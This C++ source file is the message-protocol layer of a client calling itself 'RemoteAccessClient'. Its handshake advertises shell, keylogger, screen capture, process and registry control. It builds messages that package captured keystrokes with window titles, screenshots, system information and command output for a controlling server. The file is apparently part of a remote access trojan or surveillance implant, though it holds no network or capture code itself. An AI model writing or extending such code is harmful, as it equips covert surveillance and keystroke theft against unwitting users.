#include "common/Protocol.h"
#include "common/Logger.h"
#include <chrono>
#include <iomanip>
#include <sstream>
#include <algorithm>
#include <cctype>
#include <map>

namespace Protocol {
    
    // Helper function to escape JSON strings
    std::string EscapeJsonString(const std::string& str) {
        std::string escaped;
        for (char c : str) {
            switch (c) {
                case '"': escaped += "\\\""; break;
                case '\\': escaped += "\\\\"; break;
                case '\n': escaped += "\\n"; break;
                case '\r': escaped += "\\r"; break;
                case '\t': escaped += "\\t"; break;
                default: escaped += c; break;
            }
        }
        return escaped;
    }
    
    // Helper function to build simple JSON objects
    std::string BuildJsonObject(const std::map<std::string, std::string>& fields) {
        std::string json = "{";
        bool first = true;
        for (const auto& pair : fields) {
            if (!first) json += ",";
            json += "\"" + EscapeJsonString(pair.first) + "\":\"" + EscapeJsonString(pair.second) + "\"";
            first = false;
        }
        json += "}";
        return json;
    }
    
    std::string GetCurrentTimestamp() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        
        std::stringstream ss;
        ss << std::put_time(std::gmtime(&time_t), "%Y-%m-%dT%H:%M:%SZ");
        return ss.str();
    }
    
    std::string GenerateUniqueId() {
        auto now = std::chrono::high_resolution_clock::now();
        auto timestamp = std::chrono::duration_cast<std::chrono::microseconds>(now.time_since_epoch()).count();
        return std::to_string(timestamp);
    }
    
    // Message creation functions
    std::string CreateHandshakeMessage(const std::string& clientId) {
        try {
            std::map<std::string, std::string> message;
            message["type"] = MessageType::HANDSHAKE;
            message["timestamp"] = GetCurrentTimestamp();
            message["client_id"] = clientId;
            message["version"] = "1.0.0";
            message["client_name"] = "RemoteAccessClient";
            
            // Build capabilities as nested JSON
            std::string capabilities = "{\"shell\":\"true\",\"file_operations\":\"true\",\"screen_capture\":\"true\",\"keylogger\":\"true\",\"system_info\":\"true\",\"process_management\":\"true\",\"registry_operations\":\"true\"}";
            
            std::string result = "{";
            result += "\"type\":\"" + EscapeJsonString(message["type"]) + "\",";
            result += "\"timestamp\":\"" + EscapeJsonString(message["timestamp"]) + "\",";
            result += "\"client_id\":\"" + EscapeJsonString(message["client_id"]) + "\",";
            result += "\"version\":\"" + EscapeJsonString(message["version"]) + "\",";
            result += "\"client_name\":\"" + EscapeJsonString(message["client_name"]) + "\",";
            result += "\"capabilities\":" + capabilities;
            result += "}";
            
            return result;
        } catch (const std::exception& ex) {
            Logger::LogManager::GetInstance().Error("Failed to create handshake message: " + std::string(ex.what()));
            return "";
        }
    }
    
    std::string CreateHeartbeatMessage(const std::string& clientId, int64_t sequence) {
        try {
            std::map<std::string, std::string> message;
            message["type"] = MessageType::HEARTBEAT;
            message["timestamp"] = GetCurrentTimestamp();
            message["client_id"] = clientId;
            message["sequence"] = std::to_string(sequence);
            
            return BuildJsonObject(message);
        } catch (const std::exception& ex) {
            Logger::LogManager::GetInstance().Error("Failed to create heartbeat message: " + std::string(ex.what()));
            return "";
        }
    }
    
    std::string CreateSystemInfoMessage(const std::string& clientId, const std::map<std::string, std::string>& sysInfo) {
        try {
            std::map<std::string, std::string> message;
            message["type"] = MessageType::SYSTEM_INFO;
            message["timestamp"] = GetCurrentTimestamp();
            message["client_id"] = clientId;
            
            // Add system information
            for (const auto& pair : sysInfo) {
                message[pair.first] = pair.second;
            }
            
            return BuildJsonObject(message);
        } catch (const std::exception& ex) {
            Logger::LogManager::GetInstance().Error("Failed to create system info message: " + std::string(ex.what()));
            return "";
        }
    }
    
    std::string CreateCommandResponse(const std::string& clientId, const std::string& commandId, 
                                    bool success, const std::string& response, int errorCode) {
        try {
            std::map<std::string, std::string> message;
            message["type"] = MessageType::COMMAND_RESPONSE;
            message["timestamp"] = GetCurrentTimestamp();
            message["client_id"] = clientId;
            message["command_id"] = commandId;
            message["success"] = success ? "true" : "false";
            message["response"] = response;
            message["error_code"] = std::to_string(errorCode);
            
            if (!success && errorCode != ErrorCode::SUCCESS) {
                message["error_message"] = GetErrorMessage(errorCode);
            }
            
            return BuildJsonObject(message);
        } catch (const std::exception& ex) {
            Logger::LogManager::GetInstance().Error("Failed to create command response message: " + std::string(ex.what()));
            return "";
        }
    }
    
    std::string CreateErrorMessage(const std::string& clientId, int errorCode, 
                                 const std::string& errorMessage, const std::string& context) {
        try {
            std::map<std::string, std::string> message;
            message["type"] = MessageType::ERROR_MESSAGE;
            message["timestamp"] = GetCurrentTimestamp();
            message["client_id"] = clientId;
            message["error_code"] = std::to_string(errorCode);
            message["error_message"] = errorMessage;
            
            if (!context.empty()) {
                message["context"] = context;
            }
            
            return BuildJsonObject(message);
        } catch (const std::exception& ex) {
            Logger::LogManager::GetInstance().Error("Failed to create error message: " + std::string(ex.what()));
            return "";
        }
    }
    
    std::string CreateFileResponse(const std::string& clientId, const std::string& requestId, 
                                 bool success, const std::vector<std::map<std::string, std::string>>& fileList, 
                                 int errorCode) {
        try {
            std::map<std::string, std::string> message;
            message["type"] = MessageType::FILE_RESPONSE;
            message["timestamp"] = GetCurrentTimestamp();
            message["client_id"] = clientId;
            message["request_id"] = requestId;
            message["success"] = success ? "true" : "false";
            message["error_code"] = std::to_string(errorCode);
            message["file_count"] = std::to_string(fileList.size());
            
            return BuildJsonObject(message);
        } catch (const std::exception& ex) {
            Logger::LogManager::GetInstance().Error("Failed to create file response message: " + std::string(ex.what()));
            return "";
        }
    }
    
    std::string CreateScreenCaptureMessage(const std::string& clientId, const std::string& captureId,
                                         const std::string& format, int width, int height,
                                         const std::string& imageData, bool isStreaming) {
        try {
            std::map<std::string, std::string> message;
            message["type"] = MessageType::SCREEN_CAPTURE;
            message["timestamp"] = GetCurrentTimestamp();
            message["client_id"] = clientId;
            message["capture_id"] = captureId;
            message["format"] = format;
            message["width"] = std::to_string(width);
            message["height"] = std::to_string(height);
            message["data"] = imageData;
            message["is_streaming"] = isStreaming ? "true" : "false";
            
            return BuildJsonObject(message);
        } catch (const std::exception& ex) {
            Logger::LogManager::GetInstance().Error("Failed to create screen capture message: " + std::string(ex.what()));
            return "";
        }
    }
    
    std::string CreateKeylogDataMessage(const std::string& clientId, const std::string& sessionId,
                                       const std::string& windowTitle, const std::string& keystrokes,
                                       const std::string& timestampStart, const std::string& timestampEnd) {
        try {
            std::map<std::string, std::string> message;
            message["type"] = MessageType::KEYLOG_DATA;
            message["timestamp"] = GetCurrentTimestamp();
            message["client_id"] = clientId;
            message["session_id"] = sessionId;
            message["window_title"] = windowTitle;
            message["keystrokes"] = keystrokes;
            message["timestamp_start"] = timestampStart;
            message["timestamp_end"] = timestampEnd;
            
            return BuildJsonObject(message);
        } catch (const std::exception& ex) {
            Logger::LogManager::GetInstance().Error("Failed to create keylog data message: " + std::string(ex.what()));
            return "";
        }
    }
    
    // Helper function to parse simple JSON into a map
    std::map<std::string, std::string> ParseJsonToMap(const std::string& jsonStr) {
        std::map<std::string, std::string> result;
        size_t pos = 0;
        
        while (pos < jsonStr.length()) {
            // Find key
            size_t keyStart = jsonStr.find('"', pos);
            if (keyStart == std::string::npos) break;
            keyStart++;
            
            size_t keyEnd = jsonStr.find('"', keyStart);
            if (keyEnd == std::string::npos) break;
            
            std::string key = jsonStr.substr(keyStart, keyEnd - keyStart);
            
            // Find colon
            size_t colonPos = jsonStr.find(':', keyEnd);
            if (colonPos == std::string::npos) break;
            
            // Find value
            size_t valueStart = jsonStr.find('"', colonPos);
            if (valueStart == std::string::npos) break;
            valueStart++;
            
            size_t valueEnd = jsonStr.find('"', valueStart);
            if (valueEnd == std::string::npos) break;
            
            std::string value = jsonStr.substr(valueStart, valueEnd - valueStart);
            result[key] = value;
            
            pos = valueEnd + 1;
        }
        
        return result;
    }

    // Message parsing functions
    bool ParseMessage(const std::string& jsonStr, BaseMessage& message) {
        try {
            // Simple JSON parsing - extract values between quotes
            std::map<std::string, std::string> values = ParseJsonToMap(jsonStr);
            
            if (values.find("type") != values.end()) {
                message.type = values["type"];
            }
            if (values.find("timestamp") != values.end()) {
                message.timestamp = values["timestamp"];
            }
            if (values.find("client_id") != values.end()) {
                message.client_id = values["client_id"];
            }
            
            return true;
        } catch (const std::exception& ex) {
            Logger::LogManager::GetInstance().Error("Failed to parse base message: " + std::string(ex.what()));
            return false;
        }
    }
    
    bool ParseCommandMessage(const std::string& jsonStr, CommandMessage& command) {
        try {
            // Parse base message fields
            if (!ParseMessage(jsonStr, static_cast<BaseMessage&>(command))) {
                return false;
            }
            
            std::map<std::string, std::string> values = ParseJsonToMap(jsonStr);
            
            if (values.find("command_id") != values.end()) {
                command.command_id = values["command_id"];
            }
            if (values.find("command_type") != values.end()) {
                command.command_type = values["command_type"];
            }
            if (values.find("command") != values.end()) {
                command.command = values["command"];
            }
            // Note: parameters parsing simplified - would need more complex parsing for nested objects
            
            return true;
        } catch (const std::exception& ex) {
            Logger::LogManager::GetInstance().Error("Failed to parse command message: " + std::string(ex.what()));
            return false;
        }
    }
    
    bool ParseFileRequest(const std::string& jsonStr, FileRequestMessage& request) {
        try {
            // Parse base message fields
            if (!ParseMessage(jsonStr, static_cast<BaseMessage&>(request))) {
                return false;
            }
            
            std::map<std::string, std::string> values = ParseJsonToMap(jsonStr);
            
            if (values.find("request_id") != values.end()) {
                request.request_id = values["request_id"];
            }
            if (values.find("operation") != values.end()) {
                request.operation = values["operation"];
            }
            if (values.find("file_path") != values.end()) {
                request.file_path = values["file_path"];
            }
            if (values.find("destination_path") != values.end()) {
                request.destination_path = values["destination_path"];
            }
            if (values.find("file_size") != values.end()) {
                request.file_size = std::stoll(values["file_size"]);
            }
            // Note: parameters parsing simplified
            
            return true;
        } catch (const std::exception& ex) {
            Logger::LogManager::GetInstance().Error("Failed to parse file request message: " + std::string(ex.what()));
            return false;
        }
    }
    
    // Validation functions
    bool ValidateMessage(const std::string& jsonStr) {
        try {
            std::map<std::string, std::string> values = ParseJsonToMap(jsonStr);
            
            // Check required fields
            if (values.find("type") == values.end() || values["type"].empty()) {
                return false;
            }
            if (values.find("timestamp") == values.end() || values["timestamp"].empty()) {
                return false;
            }
            if (values.find("client_id") == values.end() || values["client_id"].empty()) {
                return false;
            }
            
            return true;
        } catch (const std::exception&) {
            return false;
        }
    }
    
    bool ValidateCommandMessage(const CommandMessage& command) {
        if (command.type != MessageType::COMMAND) {
            return false;
        }
        if (command.command_id.empty() || command.command_type.empty()) {
            return false;
        }
        return true;
    }
    
    // Serialization helpers
    std::string SerializeMessage(const BaseMessage& message) {
        try {
            std::string result = "{";
            result += "\"type\":\"" + message.type + "\",";
            result += "\"timestamp\":\"" + message.timestamp + "\",";
            result += "\"client_id\":\"" + message.client_id + "\"";
            result += "}";
            
            return result;
        } catch (const std::exception& ex) {
            Logger::LogManager::GetInstance().Error("Failed to serialize message: " + std::string(ex.what()));
            return "";
        }
    }
    
    // Base64 encoding/decoding
    static const std::string base64_chars = 
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789+/";
    
    static inline bool is_base64(unsigned char c) {
        return (isalnum(c) || (c == '+') || (c == '/'));
    }
    
    std::string EncodeBase64(const std::vector<uint8_t>& data) {
        std::string ret;
        int i = 0;
        int j = 0;
        unsigned char char_array_3[3];
        unsigned char char_array_4[4];
        
        const unsigned char* bytes_to_encode = data.data();
        int in_len = static_cast<int>(data.size());
        
        while (in_len--) {
            char_array_3[i++] = *(bytes_to_encode++);
            if (i == 3) {
                char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
                char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
                char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
                char_array_4[3] = char_array_3[2] & 0x3f;
                
                for (i = 0; (i < 4); i++)
                    ret += base64_chars[char_array_4[i]];
                i = 0;
            }
        }
        
        if (i) {
            for (j = i; j < 3; j++)
                char_array_3[j] = '\0';
            
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            
            for (j = 0; (j < i + 1); j++)
                ret += base64_chars[char_array_4[j]];
            
            while ((i++ < 3))
                ret += '=';
        }
        
        return ret;
    }
    
    std::vector<uint8_t> DecodeBase64(const std::string& encoded_string) {
        int in_len = static_cast<int>(encoded_string.size());
        int i = 0;
        int j = 0;
        int in = 0;
        unsigned char char_array_4[4], char_array_3[3];
        std::vector<uint8_t> ret;
        
        while (in_len-- && (encoded_string[in] != '=') && is_base64(encoded_string[in])) {
            char_array_4[i++] = encoded_string[in]; in++;
            if (i == 4) {
                for (i = 0; i < 4; i++)
                    char_array_4[i] = static_cast<unsigned char>(base64_chars.find(char_array_4[i]));
                
                char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
                char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
                char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
                
                for (i = 0; (i < 3); i++)
                    ret.push_back(char_array_3[i]);
                i = 0;
            }
        }
        
        if (i) {
            for (j = i; j < 4; j++)
                char_array_4[j] = 0;
            
            for (j = 0; j < 4; j++)
                char_array_4[j] = static_cast<unsigned char>(base64_chars.find(char_array_4[j]));
            
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            
            for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
        }
        
        return ret;
    }
    
    // Error message helper
    std::string GetErrorMessage(int errorCode) {
        switch (errorCode) {
            case ErrorCode::SUCCESS: return "Success";
            case ErrorCode::UNKNOWN_ERROR: return "Unknown error";
            case ErrorCode::INVALID_COMMAND: return "Invalid command";
            case ErrorCode::COMMAND_FAILED: return "Command execution failed";
            case ErrorCode::FILE_NOT_FOUND: return "File not found";
            case ErrorCode::ACCESS_DENIED: return "Access denied";
            case ErrorCode::NETWORK_ERROR: return "Network error";
            case ErrorCode::TIMEOUT: return "Operation timeout";
            case ErrorCode::INVALID_PARAMETERS: return "Invalid parameters";
            case ErrorCode::NOT_IMPLEMENTED: return "Feature not implemented";
            case ErrorCode::INSUFFICIENT_PRIVILEGES: return "Insufficient privileges";
            default: return "Unknown error code";
        }
    }
}